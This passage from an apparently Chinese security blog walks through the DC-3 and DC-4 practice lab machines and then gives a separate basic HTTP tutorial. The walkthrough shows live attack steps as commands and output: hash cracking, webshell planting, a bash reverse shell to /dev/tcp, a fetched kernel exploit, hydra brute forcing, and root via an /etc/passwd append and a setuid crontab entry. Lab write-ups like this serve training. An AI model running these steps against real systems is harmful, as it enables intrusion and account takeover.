<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hashid hash.txt </span></span><br><span class="line">-<span class="operator">-File</span> <span class="string">'hash.txt'</span>--</span><br><span class="line">Analyzing <span class="string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span></span><br><span class="line"><span class="function">[+] <span class="title">Blowfish</span></span>(OpenBSD) </span><br><span class="line">[+] Woltlab Burning Board <span class="number">4</span>.x </span><br><span class="line">[+] bcrypt </span><br><span class="line">root@kali:~<span class="comment"># hashcat -m 3200 -a 0 -d 1 --force hash.txt rockyou.txt</span></span><br><span class="line">hashcat (v5.<span class="number">1.0</span>) starting...</span><br><span class="line"><span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy</span></span><br></pre></td></tr></table></figure>

<p><strong>得到密码为snoopy，登陆后台在template处添加shell.php写入一句话木马，用蚁剑连接，注意木马的路径，此处有提示</strong></p>
<p><img src="/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/2.png" alt></p>
<p><strong>进入服务器后，发现无法提权，看看该版本系统是否存有漏洞，这里选择了Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps  | exploits/linux/dos/39773.txt  进行内核提权</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">'sh -i &amp;&gt;/dev/tcp/192.168.126.33/4444 0&gt;&amp;1'</span>  <span class="comment">#反弹shell</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 16.04</span></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport <span class="number">2.</span>x (Ubuntu Desktop <span class="number">12.10</span> &lt; <span class="number">16.04</span>) - Local Code Execution                           | exploits/linux/local/<span class="number">40937.</span>txt</span><br><span class="line">Exim <span class="number">4</span> (Debian <span class="number">8</span> / Ubuntu <span class="number">16.04</span>) - Spool Privilege Escalation                              | exploits/linux/local/<span class="number">40054.</span>c</span><br><span class="line">Google Chrome (Fedora <span class="number">25</span> / Ubuntu <span class="number">16.04</span>) - <span class="string">'tracker-extract'</span> / <span class="string">'gnome-video-thumbnailer'</span> + | exploits/linux/local/<span class="number">40943.</span>txt</span><br><span class="line">LightDM (Ubuntu <span class="number">16.04</span>/<span class="number">16.10</span>) - <span class="string">'Guest Account'</span> Local Privilege Escalation                  | exploits/linux/local/<span class="number">41923.</span>txt</span><br><span class="line">Linux Kernel (Debian <span class="number">7.7</span>/<span class="number">8.5</span>/<span class="number">9.0</span> / Ubuntu <span class="number">14.04</span><span class="number">.2</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">22</span>/<span class="number">25</span> / CentOS <span class="number">7.</span> | exploits/linux_x86<span class="number">-64</span>/local/<span class="number">42275.</span>c</span><br><span class="line">Linux Kernel (Debian <span class="number">9</span>/<span class="number">10</span> / Ubuntu <span class="number">14.04</span><span class="number">.5</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">23</span>/<span class="number">24</span>/<span class="number">25</span>) - <span class="string">'ldso_dynami | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                      | exploits/linux/dos/39773.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read  | exploits/linux/local/45175.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>BPF<span class="string">' Local Privilege Escalation (Metasploit)            | exploits/linux/local/40759.rb</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>snd_timer_user_ccallback()<span class="string">' Kernel Pointer Leak         | exploits/linux/dos/46529.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition Privilege Esca | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege | exploits/linux_x86-64/local/40049.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition  | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.x (Ubuntu 16.04) - '</span>double-fdput()<span class="string">' bpf(BPF_PROG_LOAD) Privilege Escalati | exploits/linux/local/39772.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - '</span>IP6T_SO_SET_REPLACE<span class="string">' Local Privilege Escalation     | exploits/linux/local/40489.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                 | exploits/linux/dos/45919.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation              | exploits/linux/local/45010.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                     | exploits/linux/local/44298.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - '</span>netfilter target_offset<span class="string">' Local Privilege Esc | exploits/linux/local/44300.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KA | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Priv | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br></pre></td></tr></table></figure>

<p><strong>查看该exp的使用方法，先执行compile.sh、再执行doubleput即可</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/39772.txt ubuntu_v1604_shell.txt</span></span><br><span class="line">root@kali:~<span class="comment"># cat ubuntu_v1604_shell.txt </span></span><br><span class="line">An exploit that puts all this together is <span class="keyword">in</span> exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. <span class="keyword">if</span> this worked, you<span class="string">'ll have a root shell in &lt;=60 seconds.</span></span><br><span class="line"><span class="string">suid file detected, launching rootshell...</span></span><br><span class="line"><span class="string">we have root privs now...</span></span><br><span class="line"><span class="string">root@host:~/ebpf_mapfd_doubleput# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span></span><br></pre></td></tr></table></figure>

<p>先下载到本地解压缩后，开启本地的web服务器，上传到目标服务器，由于文件过大，蚁剑无法上传</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span></span><br><span class="line">unzip <span class="number">39772.</span>zip</span><br><span class="line">cd <span class="number">39772</span></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer 8000  #搭建http服务，提供文件浏览的web服务</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> ...</span><br><span class="line">$ wget http://<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">8000</span>/exploit.tar <span class="comment">#下载文件</span></span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh </span><br><span class="line">./doubleput</span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">'_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you'</span>ve enjoyed this challenge <span class="keyword">as</span> I enjoyed making it.</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-4渗透过程"><a href="#DC-4渗透过程" class="headerlink" title="DC-4渗透过程"></a><strong>DC-4渗透过程</strong></h2><p><strong>登陆页面，提示用admin登陆，这里用password.list密码本爆破，rockyou.txt需要很久时间，求出密码后登陆发现可以执行命令有回显，抓包修改反弹shell，发现了一个密码本，可能是用来爆破ssh账号的，用scp发送到本地</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/john<span class="comment"># hydra -l admin -P ./password.lst -f 192.168.126.149 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:S=logout" -v</span></span><br><span class="line"></span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="number">80</span>][<span class="type">http</span>-<span class="type">post</span>-<span class="type">form</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: admin   password: happy</span><br><span class="line"></span><br><span class="line"><span class="comment">#将文件发送到本地</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># scp ./old-passwords.bak root@192.168.126.33:/root/tools</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密码爆破，-t 64 表示线程数  -f 表示找到密码即停   -v表示显示具体的</span></span><br><span class="line">root@kali:~<span class="comment"># hydra -L users.txt -P pswd.txt ssh://192.168.126.149 -t 64 -f -v</span></span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: jim   password: jibril04</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/john<span class="comment"># ssh jim@192.168.126.149 </span></span><br><span class="line">jim@<span class="number">192.168</span>.<span class="number">126.149</span><span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i68</span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#发现邮件，查看邮件信息</span></span><br><span class="line"><span class="string">jim@dc-4:~$ cd /var/mail</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ ls</span></span><br><span class="line"><span class="string">jim  www-data</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ cat jim</span></span><br><span class="line"><span class="string">From charles@dc-4 Sat Apr 06 21:15:46 2019</span></span><br><span class="line"><span class="string">Return-path: &lt;charles@dc-4&gt;</span></span><br><span class="line"><span class="string">Hi Jim,</span></span><br><span class="line"><span class="string">I'</span>m heading off on holidays at the <span class="keyword">end</span> of today, so the boss asked me to give you my password just <span class="keyword">in</span> case anything goes wrong.</span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure>

<p><strong>信中给出了charles的密码，切换账户，查看是否有提权的途径，发现teehee命令可以执行root权限</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> charles on dc<span class="literal">-4</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc<span class="literal">-4</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line"></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># teehee --help #查看teehee的用法</span></span><br><span class="line">Usage: teehee [<span class="type">OPTION</span>]... [<span class="type">FILE</span>]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  <span class="literal">-a</span>, -<span class="literal">-append</span>              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  <span class="literal">-i</span>, -<span class="literal">-ignore</span><span class="literal">-interrupts</span>   ignore interrupt signals</span><br><span class="line">  <span class="literal">-p</span>                        diagnose errors writing to non pipes</span><br><span class="line">      -<span class="literal">-output</span><span class="literal">-error</span>[=<span class="type">MODE</span>]   set behavior on write error.  See MODE below</span><br><span class="line">      -<span class="literal">-help</span>     display this help and <span class="keyword">exit</span></span><br><span class="line">      -<span class="literal">-version</span>  output version information and <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#teehee -a 表示写入文件，但是不会覆盖，所以可以通过写入一个root用户来执行root权限</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> echo <span class="string">"admin::0:0:admin::/bin/bash"</span>|sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line">admin::<span class="number">0</span>:<span class="number">0</span>:admin::/bin/bash  <span class="comment">##[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> su admin</span><br><span class="line">root@dc<span class="literal">-4</span>:/home/charles<span class="comment"># cd /root</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat crontab # 可见文件有格式将授权命令写入该文件授权root bash</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> cat /etc/crontab</span></span><br><span class="line"><span class="string"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="string"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="string"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="string"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="string"># that none of the other crontabs do.</span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo  "</span>* * * * * root chmod <span class="number">4777</span> /bin/sh<span class="string">" | sudo teehee -a /etc/crontab</span></span><br><span class="line"><span class="string">#时间部分全部填写为*，默认这个定时任务每分钟执行一次</span></span><br><span class="line"><span class="string">#通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> /bin/sh</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls /root</span></span><br><span class="line"><span class="string">flag.txt</span></span><br></pre></td></tr></table></figure>








      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-oho" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/07/11/oho/"
    >oho</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/07/11/oho/" class="article-date">
  <time datetime="2020-07-11T06:59:21.000Z" itemprop="datePublished">2020-07-11</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      
      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-web基础-1" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/06/17/web%E5%9F%BA%E7%A1%80-1/"
    >web基础</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/06/17/web%E5%9F%BA%E7%A1%80-1/" class="article-date">
  <time datetime="2020-06-17T03:05:06.000Z" itemprop="datePublished">2020-06-17</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><h4 id="1-HTTP的基本概念"><a href="#1-HTTP的基本概念" class="headerlink" title="1.HTTP的基本概念"></a><strong>1.HTTP的基本概念</strong></h4><p>HTTP：<a href="https://baike.baidu.com/item/超文本传输协议/8535513" target="_blank" rel="noopener">超文本传输协议</a>（HTTP，HyperText Transfer Protocol)是<a href="https://baike.baidu.com/item/互联网" target="_blank" rel="noopener">互联网</a>上应用最为广泛的一种<a href="https://baike.baidu.com/item/网络协议/328636" target="_blank" rel="noopener">网络协议</a>。设计Http最初的目的是为了提供一种发布和接收<a href="https://baike.baidu.com/item/HTML" target="_blank" rel="noopener">HTML</a>页面的方法。它可以使浏览器更加高效。Http协议是以明文方式发送信息的，如果黑客截取了Web浏览器和服务器之间的传输报文，就可以直接获得其中的信息。</p>
<p><strong>HTTP原理：</strong></p>
<p>①  客户端的浏览器首先要通过网络与服务器建立连接，该<strong>连接是通过TCP 来完成的，一般 TCP 连接的端口号是80</strong>。  建立连接后，客户机发送一个请求给服务器，请求方式的格式为：<strong>统一资源标识符（URL）、协议版本号，后边是 MIME  信息包括请求修饰符、客户机信息和许可内容。</strong></p>
<p>② 服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是 MIME 信息包括服务器信息、实体信息和可能的内容。</p>
<h4 id="—-常见的HTTP相应状态码"><a href="#—-常见的HTTP相应状态码" class="headerlink" title="—-常见的HTTP相应状态码"></a><strong>—-常见的HTTP相应状态码</strong></h4><p>200：请求被正常处理<br>204：请求被受理但没有资源可以返回<br>206：客户端只是请求资源的一部分，服务器只对请求的部分资源执行GET方法，相应报文中通过Content-Range指定范围的资源。<br>301：永久性重定向<br>302：临时重定向<br>303：与302状态码有相似功能，只是它希望客户端在请求一个URI的时候，能通过GET方法重定向到另一个URI上<br>304：发送附带条件的请求时，条件不满足时返回，与重定向无关<br>307：临时重定向，与302类似，只是强制要求使用POST方法<br>400：请求报文语法有误，服务器无法识别<br>401：请求需要认证<br>403：请求的对应资源禁止被访问<br>404：服务器无法找到对应资源<br>500：服务器内部错误<br>503：服务器正忙</p>
<h4 id="—-GET方法与POST方法的区别"><a href="#—-GET方法与POST方法的区别" class="headerlink" title="—-GET方法与POST方法的区别"></a>—-GET方法与POST方法的区别</h4><p>区别一：<br>get重点在从服务器上获取资源，post重点在向服务器发送数据；<br>区别二：<br>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，<strong>多个请求数据间用”&amp;”连接</strong>，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；</a><br>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；<br>区别三：<br>Get传输的数据量小，因为受URL长度限制，但效率较高；<br><strong>Post可以传输大量数据，所以上传文件时只能用Post方式</strong>；<br>区别四：<br>get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；<br>post较get安全性较高；<br>区别五：<br>get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。<br><strong>post支持标准字符集，可以正确传递中文字符</strong>。</p>
<h4 id="—-HTTP请求报文与响应报文格式"><a href="#—-HTTP请求报文与响应报文格式" class="headerlink" title="—-HTTP请求报文与响应报文格式"></a><strong>—-HTTP请求报文与响应报文格式</strong></h4><p><strong>请求报文</strong>包含三部分：<br>a、请求行：包含<strong>请求方法、URI、HTTP版本信息</strong><br>b、请求首部字段<br>c、请求内容实体<br><strong>响应报文</strong>包含三部分：<br>a、状态行：<strong>包含HTTP版本、状态码、状态码的原因短语</strong><br>b、响应首部字段<br>c、响应内容实体</p>
<h4 id="—-常见HTTP首部字段"><a href="#—-常见HTTP首部字段" class="headerlink" title="—-常见HTTP首部字段"></a><strong>—-常见HTTP首部字段</strong></h4><p><strong>a、通用首部字段（请求报文与响应报文都会使用的首部字段）</strong><br>Date：创建报文时间<br>Connection：连接的管理<br>Cache-Control：缓存的控制<br>Transfer-Encoding：报文主体的传输编码方式</p>
<p><strong>b、请求首部字段（请求报文会使用的首部字段）</strong><br>Host：请求资源所在服务器<br>Accept：可处理的媒体类型<br>Accept-Charset：可接收的字符集<br>Accept-Encoding：可接受的内容编码<br>Accept-Language：可接受的自然语言</p>
<p><strong>c、响应首部字段（响应报文会使用的首部字段）</strong><br>Accept-Ranges：可接受的字节范围<br>Location：令客户端重新定向到的URI<br>Server：HTTP服务器的安装信息d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）<br>Allow：资源可支持的HTTP方法<br>Content-Type：实体主类的类型<br>Content-Encoding：实体主体适用的编码方式<br>Content-Language：实体主体的自然语言<br>Content-Length：实体主体的的字节数<br>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/csl/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p><code>GET</code>表示一个读取请求，将从服务器获得网页数据<code>/cs1/</code>表示URL的路径，URL总是以<code>/</code>开头，<code>/</code>就表示首页，最后的<code>HTTP/1.1</code>指示采用的HTTP协议版本是1.1。目前HTTP协议的版本就是1.1，但是大部分服务器也支持1.0版本，主要区别在于1.1版本允许多个HTTP请求复用一个TCP连接，以加快传输速度。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span>: sports.sina.com.cn</span><br></pre></td></tr></table></figure>

<p>表示请求的域名是<code>sports.sina.com.cn</code>。如果一台服务器有多个网站，服务器就需要通过<code>Host</code>来区分浏览器请求的是哪个网站</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 66125</span><br></pre></td></tr></table></figure>

